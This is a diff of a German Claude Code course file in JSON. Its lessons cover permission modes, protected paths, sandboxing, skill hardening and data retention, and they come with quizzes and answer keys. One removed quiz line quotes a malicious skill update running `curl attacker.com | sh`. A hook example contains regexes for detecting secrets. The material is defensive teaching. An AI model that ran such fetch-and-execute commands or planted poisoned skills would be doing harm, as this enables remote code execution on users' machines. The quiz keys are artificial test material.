@@ -2964,34 +2964,38 @@
    "aliases": [
     "3.3b"
    ],
-   "analogy": "Stell dir vor, das Gebäude läuft nachts ohne Wachmann. Du hast drei Möglichkeiten: ein Zutrittssystem, das an jeder Tür selbst einschätzt, ob der Zutritt riskant ist (`auto`); einen Automaten, der nur Karten von der vorprogrammierten Liste durchlässt und alle anderen abweist (`dontAsk`); oder einen Generalschlüssel ohne jedes Schloss (`bypassPermissions`), den du nur in der abgeschlossenen Testhalle ausgibst. Einzelne Türen kannst du in jedem Fall fest verriegeln (Deny) oder mit Pflicht zur Gegenzeichnung versehen (Ask).",
-   "answers": null,
+   "analogy": "Stell dir vor, das Gebäude läuft nachts ohne Wachmann. Du hast drei Möglichkeiten: ein Zutrittssystem, das an jeder Tür selbst einschätzt, ob der Zutritt riskant ist (`auto`); einen Automaten, der nur Karten von der vorprogrammierten Liste durchlässt und alle anderen abweist (`dontAsk`); oder einen Generalschlüssel, der fast alle Türen öffnet und den du nur in der abgeschlossenen Testhalle ausgibst (`bypassPermissions`). Einzelne Türen bleiben auch mit dem Generalschlüssel fest verriegelt (Deny). Türen mit Pflicht zur Gegenzeichnung (Ask) bleiben für den Automaten zu, weil nachts niemand gegenzeichnet.",
+   "answers": [
+    "Beide werden abgelehnt. `dontAsk` lehnt jeden Aufruf ab, der sonst eine Rückfrage ausgelöst hätte; Ask-Regeln werden dort abgelehnt statt gefragt.",
+    "Die Deny-Regel. Die Reihenfolge ist Deny, Ask, Allow, der erste Treffer entscheidet. Eine `Bash(rm *)`-Regel prüft nur den Befehlstext und lässt `/bin/rm …` und `bash -c 'rm …'` offen; unter Windows braucht das PowerShell-Werkzeug eine eigene Regel.",
+    "Der Modus fragt nicht und bietet keinen Schutz gegen Prompt Injection oder ungewollte Aktionen, auch Schreibzugriffe auf geschützte Pfade laufen durch. Die Root-Sperre greift nur, wenn du als root oder mit `sudo` startest; auf einem normal angemeldeten Konto schützt sie die Workstation nicht."
+   ],
    "area": "permissions",
-   "checkpoint": "Du kannst für einen autonomen Lauf den passenden Modus samt Allow-, Ask- und Deny-Regeln wählen und begründen, warum `bypassPermissions` nur in einen isolierten Wegwerf-Container gehört.",
+   "checkpoint": "Du kannst für einen autonomen Lauf den passenden Modus wählen, Allow-, Ask- und Deny-Regeln schreiben und prüfen und begründen, warum `bypassPermissions` nur in einen isolierten Wegwerf-Container gehört.",
    "demo": "../moderation/vorfuehren/s3-08-rechte-fuer-autonomie.md",
-   "example": "claude --permission-mode dontAsk \\\n  --allowedTools \"Read,Glob,Grep,Bash(npm test)\" \\\n  --output-format json \\\n  -p \"Run the test suite and emit a structured failure report.\"",
-   "example_lang": "bash",
+   "example": "   {\n     \"permissions\": {\n       \"allow\": [\"Edit\", \"Bash(git *)\", \"PowerShell(git *)\"],\n       \"ask\": [\"Bash(git commit *)\", \"PowerShell(git commit *)\"],\n       \"deny\": [\"Edit(config.txt)\"]\n     }\n   }",
+   "example_lang": "json",
    "file": "s3-08-rechte-fuer-autonomie.md",
-   "glance": "Läuft Claude ohne dich, entscheidet der Modus, wer statt dir prüft: in `auto` ein Klassifikator, in `dontAsk` nur deine Allow-Regeln, in `bypassPermissions` niemand. Dieser letzte Modus gehört ausschließlich in einen isolierten Wegwerf-Container, nie auf eine Arbeits-Workstation. Harte Grenzen ziehst du mit Regeln, denn Deny-Regeln blocken in jedem Modus.",
+   "glance": "Läuft Claude ohne dich, entscheidet der Modus, wer statt dir prüft: in `auto` ein Klassifikator, in `dontAsk` nur deine Regeln, in `bypassPermissions` niemand. Für Läufe, die du vorab festlegen kannst, ist `dontAsk` der Modus, in dem deine Regeln entscheiden: Was keine Rückfrage braucht oder eine Allow-Regel trifft, läuft, alles andere wird abgelehnt. Harte Grenzen ziehst du mit Deny-Regeln, denn sie blocken in jedem Modus. `bypassPermissions` gehört ausschließlich in einen isolierten Wegwerf-Container.",
    "id": "S3.8",
    "level": "core",
-   "minutes": 15,
+   "minutes": 30,
    "offers": [],
    "order": 3080,
-   "outcome": "Ich kann für einen autonomen Lauf zwischen auto, dontAsk und bypassPermissions wählen, die nötigen Allow-, Ask- und Deny-Regeln schreiben und begründen, warum bypassPermissions nur in einen isolierten Wegwerf-Container gehört.",
+   "outcome": "Ich kann für einen autonomen Lauf zwischen auto, dontAsk und bypassPermissions wählen, Allow-, Ask- und Deny-Regeln für den Lauf schreiben und in einem Wegwerf-Ordner prüfen, dass sie halten, und begründen, warum bypassPermissions nur in einen isolierten Wegwerf-Container gehört.",
    "quiz": {
-    "correct": "Er schreibt ohne Rückfrage, auch in `.git`; unter Linux und macOS verweigert Claude Code ihn als root außerhalb einer erkannten Sandbox.",
-    "q": "Warum gehört `bypassPermissions` nicht auf deine Arbeits-Workstation, und welche eingebaute Sperre erinnert daran?",
+    "correct": "`npm install` braucht eine Freigabe und trifft keine Allow-Regel, deshalb lehnt `dontAsk` ihn ab. Erlauben kannst du ihn mit `Bash(npm install)` in der Allow-Liste.",
+    "q": "Ein nächtlicher Lauf in `dontAsk` hat nur `Bash(npm test)` in der Allow-Liste. Im Protokoll steht, dass Claude `npm install` nicht ausführen konnte. Was ist passiert und was tust du?",
     "wrong": [
-     "Er ist auf der Workstation sicher, sobald du die geschützten Pfade zusätzlich als Allow-Regeln in die `settings.json` des Projekts einträgst.",
-     "Er ist nur unter macOS gefährlich; Linux und Windows bringen eine Kernel-Sandbox mit, die ihn auf der Workstation absichert.",
-     "Er entspricht `dontAsk`; der einzige Unterschied ist, dass er zusätzlich Skills und Subagenten ohne Bestätigung starten darf."
+     "Claude hat bei `npm install` nachgefragt, im nächtlichen Lauf antwortet niemand, und der Lauf wartet deshalb weiter auf eine Antwort von dir.",
+     "`dontAsk` sperrt alles, was das Netz berührt, und eine Allow-Regel kann an dieser Sperre nichts ändern, auch nicht für diesen einen Befehl.",
+     "Der Lauf braucht `bypassPermissions`, denn Allow-Regeln wirken nur dort, und `dontAsk` lässt ausschließlich Lesebefehle zu, sonst nichts."
     ]
    },
    "recall": [
-    "Welche Dateisystem-Befehle genehmigt `acceptEdits` im Arbeitsordner still, und was fragt weiter?",
-    "Was passiert mit einem Aufruf, der zu einer Ask-Regel passt, in `auto`, in `dontAsk` und in `bypassPermissions`?",
-    "Welche zwei Flags gehören in jeden unbeaufsichtigten `dontAsk`-Lauf, damit er weder unbegrenzt kostet noch unbegrenzt läuft?"
+    "Was geschieht in `dontAsk` mit einem Aufruf ohne passende Allow-Regel und mit einem Aufruf, der eine Ask-Regel trifft?",
+    "Deny, Ask und Allow treffen denselben Aufruf: Wer entscheidet, und welchen Weg lässt eine `Bash(rm *)`-Regel offen?",
+    "Warum gehört `bypassPermissions` nur in einen isolierten Wegwerf-Container, und was leistet die Root-Sperre dabei nicht?"
    ],
    "requires": [
     "S1.6"
@@ -3007,8 +3011,8 @@
    "session": 3,
    "shelf": "permissions",
    "skip_check": [
-    "Hast du schon einmal Allow-, Ask- oder Deny-Regeln für Bash, Skills, Subagenten oder WebFetch in `settings.json` geschrieben, statt dich nur auf den Modus zu verlassen?",
-    "Kannst du ohne Nachschlagen sagen, welche Dateisystem-Befehle `acceptEdits` im Arbeitsordner still durchwinkt?"
+    "Hast du schon einmal eine Sitzung in `dontAsk` gestartet und gesehen, was Claude Code dort ablehnt?",
+    "Kannst du ohne Nachschlagen sagen, welche Regel gewinnt, wenn Deny, Ask und Allow denselben Aufruf treffen?"
    ],
    "sources": [
     "https://code.claude.com/docs/en/permission-modes",
@@ -3020,34 +3024,38 @@
   },
   {
    "aliases": [],
-   "analogy": "Geschützte Pfade sind die Tresorräume im Gebäude. Mit Besucher- oder Wartungsausweis kommst du nie ohne Gegenzeichnung hinein, und auch ein Dauereintrag auf der Zutrittsliste (eine Allow-Regel) öffnet sie nicht. Nur der Generalschlüssel sperrt sie ohne Frage auf; deshalb gibt es ihn nur in der abgeschlossenen Testhalle.",
-   "answers": null,
+   "analogy": "Geschützte Pfade sind die Tresorräume im Gebäude. Mit Besucher- oder Wartungsausweis kommst du nie ohne Gegenzeichnung hinein, und auch ein Dauereintrag auf der Zutrittsliste (eine Allow-Regel) öffnet sie nicht. Nur der Generalschlüssel (`bypassPermissions`) sperrt sie ohne Frage auf.",
+   "answers": [
+    "In `acceptEdits` fragt Claude Code, in `dontAsk` lehnt es ab, in `bypassPermissions` schreibt es ohne Rückfrage. Eine Allow-Regel ändert daran nichts, denn die Prüfung der geschützten Pfade läuft vor den Allow-Regeln.",
+    "Sie begrenzt Bash-, PowerShell- und Monitor-Befehle samt ihren Kindprozessen. Read, Edit, Write, WebFetch, WebSearch, Hooks und lokale MCP-Server laufen außerhalb. Unter nativem Windows läuft sie nicht.",
+    "Die OS-Sandbox deckt nur Shell-Befehle ab; Datei-Werkzeuge, MCP-Server und Hooks liefen weiter auf deinem Rechner. Die Doku nennt einen Container, eine VM oder die Sandbox-Runtime, also eine Grenze um den ganzen Claude-Code-Prozess."
+   ],
    "area": "permissions",
-   "checkpoint": "Du kannst die geschützten Pfade nennen, sagen, in welchem Modus Claude Code trotzdem ohne Rückfrage hineinschreibt, und für eine riskante Aufgabe die passende Isolationsstufe wählen.",
+   "checkpoint": "Du kannst an einem Versuch zeigen, was Claude Code in geschützten Pfaden je Modus tut, und für eine riskante Aufgabe die Isolationsstufe wählen.",
    "demo": null,
-   "example": "git worktree add ../agent-task-1 -b agent/task-1\n# Agent arbeitet in ../agent-task-1 (Stufe 1: eigener Arbeitsordner, gleiches Dateisystem)\n# Der Hauptordner und sein Branch bleiben unangetastet",
-   "example_lang": "bash",
+   "example": "   {\n     \"permissions\": {\n       \"allow\": [\"Edit(.claude/**)\", \"Edit(.git/**)\", \"Edit(notes.txt)\"]\n     }\n   }",
+   "example_lang": "json",
    "file": "s3-09-geschuetzte-pfade-und-sandbox.md",
-   "glance": "Geschützte Pfade wie `.git`, `.claude`, Shell-Startdateien und `.mcp.json` beschreibt Claude Code nie ohne Prüfung, und keine Allow-Regel ändert das. Die Ausnahme ist `bypassPermissions`: Ist der Modus aktiv (oder im Plan-Modus einer Sitzung, die ihn freigeschaltet hat), schreibt Claude Code auch dort ohne Rückfrage. Die eingebaute Sandbox begrenzt nur Shell-Befehle, nicht Read, Edit und Write, und läuft nicht unter nativem Windows.",
+   "glance": "Geschützte Pfade wie `.git`, `.claude`, Shell-Startdateien und `.mcp.json` beschreibt Claude Code nie ohne Prüfung, und keine Allow-Regel ändert das. In `default` und `acceptEdits` fragt Claude Code, in `dontAsk` lehnt es ab. Die Ausnahme ist `bypassPermissions` (und der Plan-Modus einer Sitzung, in der dieser Modus freigeschaltet ist): Dort schreibt Claude Code auch in geschützte Pfade ohne Rückfrage.",
    "id": "S3.9",
    "level": "core",
-   "minutes": 15,
+   "minutes": 30,
    "offers": [],
    "order": 3090,
-   "outcome": "Ich kann sagen, welche Pfade Claude Code nie ohne Prüfung beschreibt und in welchem Modus doch, und für eine riskante Aufgabe die passende Isolationsstufe wählen: OS-Sandbox, Worktree, Container oder eigene VM.",
+   "outcome": "Ich kann an einem Versuch zeigen, dass Claude Code in geschützten Pfaden auch in acceptEdits nachfragt und in dontAsk ablehnt, und für eine riskante Aufgabe die passende Isolationsstufe wählen: OS-Sandbox, Worktree, Container oder eigene VM.",
    "quiz": {
-    "correct": "Geschützte Pfade legen fest, welche Schreibzugriffe geprüft werden; die Sandbox begrenzt, was ein Shell-Befehl erreicht.",
-    "q": "Welche Aussage beschreibt geschützte Pfade und die OS-Sandbox richtig?",
+    "correct": "Claude Code fragt nach, denn `.claude` ist ein geschützter Pfad und die Sandbox gilt nur für Shell-Befehle, nicht für das Edit-Werkzeug.",
+    "q": "Du hast `/sandbox` eingeschaltet und arbeitest in `acceptEdits`. Claude soll die Datei `.claude/settings.json` deines Projekts per Edit ändern. Was passiert?",
     "wrong": [
-     "Die Sandbox macht geschützte Pfade überflüssig, weil sie Schreibzugriffe auf `.git` für alle Werkzeuge sperrt, auch für Edit.",
-     "Geschützte Pfade gelten nur in `auto`; in `default` und `acceptEdits` schreibt Claude Code dort ohne Rückfrage hinein.",
-     "Mit `/sandbox` übernimmt Docker die geschützten Pfade und ersetzt die eingebaute Liste durch eigene Mount-Regeln."
+     "Die Änderung läuft ohne Rückfrage, denn mit eingeschalteter Sandbox sind Schreibzugriffe im Projektordner für alle Werkzeuge abgesichert.",
+     "Claude Code lehnt ab, weil die Sandbox `.claude` für alle Werkzeuge schreibgeschützt hält, auch wenn du es freigeben würdest.",
+     "Claude Code fragt nur, weil keine Allow-Regel vorhanden ist; mit `Edit(.claude/**)` in den Settings liefe die Änderung ohne Rückfrage."
     ]
    },
    "recall": [
-    "Was passiert mit einem Schreibzugriff auf `.git` in `default`, in `auto`, in `dontAsk` und in `bypassPermissions`?",
-    "Welche Werkzeuge begrenzt die eingebaute Sandbox, und welche nicht?",
-    "Du willst generierten, unbekannten Code ausführen, ohne den Host zu gefährden. Welche Stufe brauchst du mindestens?"
+    "Was passiert mit einem Schreibzugriff auf `.git` in `acceptEdits`, in `dontAsk` und in `bypassPermissions`, und ändert eine Allow-Regel daran etwas?",
+    "Welche Werkzeuge begrenzt die eingebaute Sandbox, welche nicht, und wo läuft sie nicht?",
+    "Du willst einen Nachtlauf mit `--dangerously-skip-permissions` starten. Warum reicht die OS-Sandbox allein dafür nicht, und welche Stufen nennt die Doku?"
    ],
    "requires": [
     "S3.8"
@@ -3064,8 +3072,8 @@
    "session": 3,
    "shelf": "permissions",
    "skip_check": [
-    "Hast du schon einmal `/sandbox` eingeschaltet und geprüft, was die Sandbox blockt, etwa einen Netzzugriff oder einen Schreibzugriff außerhalb des Projekts?",
-    "Kannst du ohne Nachschlagen sagen, in welchem Rechte-Modus Claude Code ohne Rückfrage in `.git` schreibt?"
+    "Kannst du ohne Nachschlagen sagen, was `acceptEdits` mit einem Schreibzugriff auf `.git` macht?",
+    "Kannst du sagen, ob die eingebaute Sandbox auch die Edit-Änderungen von Claude begrenzt?"
    ],
    "sources": [
     "https://code.claude.com/docs/en/permission-modes",
@@ -3077,34 +3085,38 @@
   },
   {
    "aliases": [],
-   "analogy": "Stell dir einen Zutrittscontroller mit drei zusätzlichen Sperren vor. Die Domain-Sperrliste ist eine feste Schwarzliste für bestimmte Ausgänge: Durch diese Tür kommt niemand, egal welcher Ausweis sonst gilt. `hard_deny` ist die Sicherheitsverriegelung, die auch der Bereichsleiter nicht übersteuert: Die Tür zum Hochsicherheitsbereich bleibt zu, selbst mit Generalschlüssel und guter Begründung. `disableSkillShellExecution` ist der versiegelte Wartungsport am RS-485-Bus: Über ein Update der Dienstanweisung gelangt kein fremder Code mehr in die Anlage.",
-   "answers": null,
+   "analogy": "Stell dir einen Zutrittscontroller mit drei zusätzlichen Sperren vor. Die Domain-Sperrliste ist eine feste Schwarzliste für bestimmte Ausgänge: Durch diese Tür kommt niemand, egal welcher Ausweis sonst gilt. `hard_deny` ist die Sicherheitsverriegelung, die auch der Bereichsleiter nicht übersteuert. `disableSkillShellExecution` ist das Siegel auf der Wartungsklappe: Ein geänderter Skill kann dort keinen Befehl mehr einschleusen, der beim Öffnen läuft.",
+   "answers": [
+    "Sie bleibt gesperrt. Die Sperre gilt nur für Befehle in der Sandbox, nicht für Read, Edit, WebFetch und WebSearch; für WebFetch brauchst du eine `WebFetch(domain:…)`-Regel unter `permissions.deny`.",
+    "Damit ein fremdes Repo sich keine eigenen Ausnahmen mitbringen kann. Harte Sperren nach Tool-Muster wie `Bash(psql *)` gehören in `permissions.deny`, weil `autoMode`-Einträge Sätze sind.",
+    "Den Platzhalter `[shell command execution disabled by policy]`. Mitgelieferte Skills und Skills aus den Managed Settings sind ausgenommen."
+   ],
    "area": "permissions",
-   "checkpoint": "Du kannst für jeden der drei Schalter sagen, was er sperrt und in welcher Settings-Datei er wirkt, und begründen, in welchem Angriffsszenario `disableSkillShellExecution` den Unterschied macht.",
+   "checkpoint": "Du kannst für jeden der drei Schalter sagen, was er sperrt und in welcher Settings-Datei er wirkt, und am Versuch zeigen, was `disableSkillShellExecution` verändert.",
    "demo": null,
-   "example": "{\n  \"sandbox\": {\n    \"network\": {\n      \"deniedDomains\": [\"legacy-scada.corp.internal\"]\n    }\n  },\n  \"autoMode\": {\n    \"hard_deny\": [\n      \"$defaults\",\n      \"Never touch the production database tooling, no matter how safe the action looks\"\n    ]\n  },\n  \"disableSkillShellExecution\": true\n}",
+   "example": "   {\n     \"disableSkillShellExecution\": true\n   }",
    "example_lang": "json",
    "file": "s3-10-netzwerk-und-skills-haerten.md",
    "glance": "Drei Schalter verkleinern die Angriffsfläche, ohne dass du Sandbox, Auto-Modus oder Skills ganz abschaltest. `sandbox.network.deniedDomains` sperrt einzelne Domains für Befehle in der Sandbox, auch wenn eine breitere Freigabe sie erlauben würde. `autoMode.hard_deny` gibt dem Klassifikator des Auto-Modus Regeln, die weder eine Bitte des Nutzers noch eine Ausnahme aufweicht. `disableSkillShellExecution` verhindert, dass Skills beim Laden Shell-Befehle über `` !`…` `` ausführen.",
    "id": "S3.10",
    "level": "deep-dive",
-   "minutes": 12,
+   "minutes": 20,
    "offers": [],
    "order": 3100,
-   "outcome": "Ich kann mit sandbox.network.deniedDomains, autoMode.hard_deny und disableSkillShellExecution die Angriffsfläche einer autonomen Sitzung verkleinern und sagen, in welcher Settings-Datei jeder dieser Schalter wirkt.",
+   "outcome": "Ich kann zu sandbox.network.deniedDomains, autoMode.hard_deny und disableSkillShellExecution sagen, was sie sperren und in welcher Settings-Datei sie wirken, und an einem Versuch zeigen, dass disableSkillShellExecution den Shell-Teil eines Skills abschaltet.",
    "quiz": {
     "correct": "`disableSkillShellExecution: true`, denn dann setzt Claude Code statt des Befehls nur einen Platzhaltertext ein.",
-    "q": "Ein Pentest-Team zeigt: Ein bösartiges Skill-Update mit `` !`curl attacker.com | sh` `` führt beim Laden des Skills Shell-Code aus. Welche Einstellung verhindert genau das?",
+    "q": "Ein Pentest-Team zeigt: Ein bösartiges Skill-Update mit einer `` !`…` ``-Zeile, die eine Domain des Angreifers aufruft und das Ergebnis in eine Shell leitet, führt beim Laden des Skills Shell-Code aus. Welche Einstellung verhindert genau das?",
     "wrong": [
-     "`sandbox.network.deniedDomains` mit `attacker.com`, denn dann startet gar kein Befehl, der diese Domain im Text nennt.",
-     "`autoMode.hard_deny` mit `Bash(curl *)`, denn dort stehen Tool-Muster wie in `permissions.deny`.",
-     "Protected Paths für `.claude/skills`, denn geschützte Pfade sperren auch das Ausführen der Skills darin."
+     "`sandbox.network.deniedDomains` mit der Domain des Angreifers, denn schon die Domain im Befehlstext lässt Claude Code das Laden des Skills abbrechen.",
+     "`autoMode.hard_deny` mit einem Muster wie `Bash(curl *)`, denn dort stehen Tool-Muster wie in `permissions.deny`, und der Befehl läuft vor dem Klassifikator.",
+     "Geschützte Pfade für `.claude/skills`, denn geschützte Pfade sperren auch das Ausführen der Skills darin."
     ]
    },
    "recall": [
-    "Was passiert mit einer Domain, die in `deniedDomains` steht und zugleich von einem Platzhalter in `allowedDomains` getroffen wird?",
-    "Warum liest der Klassifikator `autoMode` nicht aus der `.claude/settings.json` eines Repos?",
-    "Wann gehört eine Sperre in `autoMode.hard_deny`, wann in `permissions.deny`?"
+    "Was passiert mit einer Domain, die in `deniedDomains` steht und zugleich von einem Platzhalter in `allowedDomains` getroffen wird, und welche Zugriffe erfasst die Sperre nicht?",
+    "Warum liest der Klassifikator `autoMode` nicht aus der `.claude/settings.json` eines Repos, und was gehört stattdessen in `permissions.deny`?",
+    "Was zeigt Claude statt der Ausgabe eines `` !`…` ``-Befehls, wenn `disableSkillShellExecution` gilt, und welche Skills sind davon ausgenommen?"
    ],
    "requires": [
     "S3.9"
@@ -3122,8 +3134,8 @@
    "session": 3,
    "shelf": "security",
    "skip_check": [
-    "Hast du schon einmal eine Domain per `sandbox.network.deniedDomains` gesperrt, obwohl Netzwerkzugriff sonst erlaubt war?",
-    "Kannst du ohne Nachschlagen sagen, was `disableSkillShellExecution` abschaltet und warum ein `autoMode`-Block in der `.claude/settings.json` eines Repos nichts bewirkt?"
+    "Kannst du ohne Nachschlagen sagen, was `disableSkillShellExecution` abschaltet?",
+    "Weißt du, warum ein `autoMode`-Block in der `.claude/settings.json` eines Repos nichts bewirkt?"
    ],
    "sources": [
     "https://code.claude.com/docs/en/sandboxing",
@@ -3137,34 +3149,38 @@
   },
   {
    "aliases": [],
-   "analogy": "Das ist wie die Aufbewahrungsrichtlinie für Videoaufnahmen. Der Consumer-Plan ist ein 30-Tage-Ringspeicher mit Opt-in-Archiv, und wer das Archiv erlaubt, erlaubt dem Hersteller auch, die Aufnahmen zur Produktverbesserung zu nutzen. Enterprise ist derselbe 30-Tage-Ringspeicher, aber ohne Weitergabe. ZDR sind Kameras, die laufen, aber nichts aufzeichnen: maximaler Datenschutz, dafür fällt die Wiedergabe weg.",
-   "answers": null,
+   "analogy": "Denk an die Aufbewahrungsrichtlinie für Videoaufnahmen. Der Consumer-Plan ist ein Ringspeicher, dessen Dauer davon abhängt, ob du das Archiv erlaubst; wer es erlaubt, erlaubt dem Hersteller auch, die Aufnahmen zur Produktverbesserung zu nutzen. Ein kommerzieller Plan ist ein 30-Tage-Ringspeicher ohne Weitergabe. ZDR sind Kameras, die laufen, aber nichts aufzeichnen: Dafür fallen Funktionen weg, die eine Aufzeichnung brauchen.",
+   "answers": [
+    "(a) ZDR; es gilt nur für die direkte Anthropic-Plattform, Chat, Cowork und Integrationen bleiben draußen. (b) Auto-Memory aus; die Sitzungsprotokolle auf deinem Rechner bleiben. (c) der PreToolUse-Hook auf `Write|Edit`; er erkennt nur bekannte Muster und deckt Schreibwege über die Shell nicht ab.",
+    "`exit 2`; jeder andere Code lässt den Schreibzugriff durch. Der Scanner endet bei unlesbarer Eingabe selbst mit `exit 2` und blockt: Ein kaputter Wächter soll die Tür schließen, nicht öffnen.",
+    "Mit erlaubtem Training 5 Jahre, ohne 30 Tage."
+   ],
    "area": "review",
-   "checkpoint": "Du kannst die drei Aufbewahrungsstufen nennen und für EN 50131, DSGVO und NIS2 jeweils eine passende Kontrolle aus dem Kurs zuordnen: Plan, Schalter, Rechte-Regel oder Freigabe-Gate.",
+   "checkpoint": "Du kannst die Aufbewahrungsstufen nennen, Anliegen einer Kontrolle zuordnen und einen Hook gegen sensible Muster einrichten.",
    "demo": null,
    "example": "#!/bin/bash\n# sensitive-data-scanner.sh - PreToolUse hook (matcher \"Write|Edit\"): block sensitive data in file writes.\n# tested asset: resources/demos/assets/hooks/sensitive-data-scanner.sh\n#\n# Write sends the new file text as tool_input.content, Edit sends it as tool_input.new_string.\n# exit 2 blocks the write; any other non-zero exit code would let it through.\n\nINPUT=$(cat)\n\n# Fail closed: if the input cannot be read, block instead of silently allowing the write.\nif ! CONTENT=$(printf '%s' \"$INPUT\" | jq -er '.tool_input.content // .tool_input.new_string // \"\"' 2>/dev/null); then\n  echo \"SCANNER: could not read the hook input (is jq installed?) - blocking to stay safe.\" >&2\n  exit 2\nfi\n\n# Adapt to your domain (card reader formats, internal IP ranges, ...). grep -E has no \\d: use [0-9].\nPATTERNS='([0-9]{3}-[0-9]{2}-[0-9]{4}|[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}|(sk-|pk_)[A-Za-z0-9]{20,}|AKIA[A-Z0-9]{16}|password[[:space:]]*=[[:space:]]*\"[^\"]+\")'\n\nif printf '%s' \"$CONTENT\" | grep -qiE -- \"$PATTERNS\"; then\n  # Do not echo the match itself: stderr goes to Claude as the block reason.\n  echo \"BLOCKED: sensitive data pattern detected in the file content.\" >&2\n  echo \"Redact or remove it before writing (use an environment variable or a secret store).\" >&2\n  exit 2\nfi\n\nexit 0",
    "example_lang": "bash",
    "file": "s3-11-datenschutz-und-compliance.md",
-   "glance": "Wie lange Anthropic deine Prompts und Antworten aufbewahrt und ob damit trainiert wird, hängt vom Plan ab: bei Free, Pro und Max je nach deiner Einstellung 5 Jahre oder 30 Tage, bei Team, Enterprise und API 30 Tage ohne Training, mit Zero Data Retention (ZDR, nur für geprüfte Enterprise-Organisationen) keine Speicherung nach der Antwort. In regulierten Umgebungen kommen Kontrollen aus dem Kurs dazu: Auto-Memory aus, Freigabe-Gates in jeder Automation, ein Hook gegen sensible Daten und eine Allowlist für ausgehende Anfragen.",
+   "glance": "Wie lange Anthropic deine Prompts und Antworten aufbewahrt und ob damit trainiert wird, hängt vom Plan ab: bei Free, Pro und Max je nach deiner Einstellung 5 Jahre oder 30 Tage, bei Team, Enterprise und API 30 Tage ohne Training, mit Zero Data Retention (ZDR, nur für von Anthropic freigeschaltete Organisationen) keine Speicherung nach der Antwort. Daneben gibt es Kontrollen auf deiner Seite: Auto-Memory abschalten, ein Hook gegen sensible Muster, Regeln für ausgehende Anfragen, menschliche Freigabe.",
    "id": "S3.11",
    "level": "deep-dive",
-   "minutes": 15,
+   "minutes": 25,
    "offers": [],
    "order": 3110,
-   "outcome": "Ich kann die Aufbewahrungsstufen der Claude-Pläne benennen, für eine regulierte Branche passende Kontrollen aus dem Kurs zuordnen und einen PreToolUse-Hook einsetzen, der sensible Muster in Datei-Schreibzugriffen blockt.",
+   "outcome": "Ich kann die Aufbewahrungsstufen der Claude-Pläne benennen, Anliegen wie „nichts speichern“, „kein Gedächtnis“ oder „keine Schlüssel in Dateien“ einer Kontrolle zuordnen und einen PreToolUse-Hook einrichten, der sensible Muster in Datei-Schreibzugriffen blockt.",
    "quiz": {
-    "correct": "Enterprise-Plan, bei Bedarf mit ZDR, Auto-Memory aus, Freigabe-Gate in jeder Automation, kein `/autofix-pr` auf geschützten Branches.",
-    "q": "Eine Firma für Sicherheitstechnik prüft, ob sie Claude Code für Code-Reviews an der Firmware einer nach EN 50131 zertifizierten Alarmzentrale einsetzen darf. Welche Kombination passt zu den Mustern dieses Kapitels?",
+    "correct": "Dafür braucht es ZDR, das Anthropic je Organisation freischaltet. Der Team-Plan trainiert standardmäßig nicht, bewahrt aber 30 Tage auf.",
+    "q": "Ein Team auf dem Team-Plan soll laut seiner Datenschutzabteilung „nichts mehr bei Anthropic speichern“. Was sagst du?",
     "wrong": [
-     "Pro-Plan, `DISABLE_TELEMETRY=1` gegen das Training, Auto-Memory an, Firmware-Updates dürfen autonom in einer nächtlichen Schleife laufen.",
-     "Enterprise mit ZDR, das allein erfüllt EN 50131, DSGVO und NIS2 schon; Auto-Memory darf an bleiben, Freigabe-Gates entfallen.",
-     "Team-Plan, Anthropics API-Domain in `sandbox.network.deniedDomains`, Auto-Memory aus, `/autofix-pr` auf allen Branches erlaubt."
+     "`DISABLE_TELEMETRY=1` in den Umgebungsvariablen aller Rechner genügt, denn damit speichert Claude Code nichts mehr bei Anthropic.",
+     "Ein Admin schaltet ZDR in den Einstellungen der Organisation ein, danach gilt es für alle Anmeldungen und für alle Funktionen.",
+     "Jeder Enterprise-Plan enthält ZDR bereits, deshalb ist der Wechsel vom Team-Plan auf Enterprise die einzige nötige Änderung."
     ]
    },
    "recall": [
-    "Wie lange werden Daten bei einem Pro-Plan aufbewahrt, wenn du Training erlaubst, und wie lange, wenn nicht?",
-    "Welche Funktionen fallen unter ZDR weg, und warum?",
-    "Womit schaltest du Auto-Memory für eine sensible Sitzung ab?"
+    "Ordne zu: Welche Kontrolle passt zu (a) „nach der Antwort nichts bei Anthropic speichern“, (b) „keine Inhalte früherer Sitzungen in neue Prompts ziehen“, (c) „keine Schlüssel in Dateien schreiben“, und was deckt jede nicht ab?",
+    "Welcher Exit-Code lässt einen PreToolUse-Hook blocken, und was tut der Scanner dieses Kapitels, wenn er seine Eingabe nicht lesen kann?",
+    "Wie lange werden Daten bei einem Pro-Plan aufbewahrt, wenn du Training erlaubst, und wie lange, wenn nicht?"
    ],
    "requires": [
     "S3.9"
@@ -3182,8 +3198,8 @@
    "session": 3,
    "shelf": "security",
    "skip_check": [
-    "Hast du schon geprüft, welche Trainings- und Aufbewahrungsregeln für deinen Claude-Plan gelten und ob Zero Data Retention (ZDR) für euch in Frage kommt?",
-    "Kannst du ohne Nachschlagen einen PreToolUse-Hook skizzieren, der sensible Muster in Datei-Schreibzugriffen blockt?"
+    "Weißt du, welche Trainings- und Aufbewahrungsregel für deinen Claude-Plan gilt?",
+    "Kannst du ohne Nachschlagen sagen, welcher Exit-Code einen PreToolUse-Hook zum Blocken bringt?"
    ],
    "sources": [
     "https://code.claude.com/docs/en/data-usage",
@@ -3200,33 +3216,37 @@
     "3.4"
    ],
    "analogy": "Denk an die Einsatzplanung einer Wachzentrale. `/loop` ist der Wachmann, der selbst seine Runden dreht und aufhört, wenn seine Schicht endet. `/goal` ist der Einsatz, der weiterläuft, bis die Alarmzone wieder grün ist, egal wie lange das dauert. `/schedule` trägt eine Patrouille in den Schichtplan der Zentrale ein: Die Routine startet nach Kalender, auch wenn der Schichtleiter nicht da ist, und lässt sich pausieren und wieder aktivieren.",
-   "answers": null,
+   "answers": [
+    "Er hört auf: Loops gehören zur Sitzung. Sonst endet er, wenn du ihn abbrichst, wenn Claude die Aufgabe bei einem selbst getakteten Loop für erledigt hält, oder nach sieben Tagen.",
+    "Ein kleines, schnelles Modell prüft nach jeder Runde, ob die Bedingung erfüllt ist. Es liest nur, was im Gespräch steht, und führt selbst keine Befehle aus; deshalb muss Claudes eigene Ausgabe die Bedingung belegen.",
+    "Eine Routine mit `/schedule`. Sie läuft in der Cloud mit einem frischen Klon vom Standardbranch, also sieht sie nur, was auf dem Remote liegt."
+   ],
    "area": "automation",
-   "checkpoint": "Du kannst für die drei Fälle „jetzt live im Terminal alle 5 Minuten\", „bis alle TypeScript-Fehler behoben sind\" und „jede Nacht um 02:00\" das passende Werkzeug wählen und seine Kostenform einschätzen.",
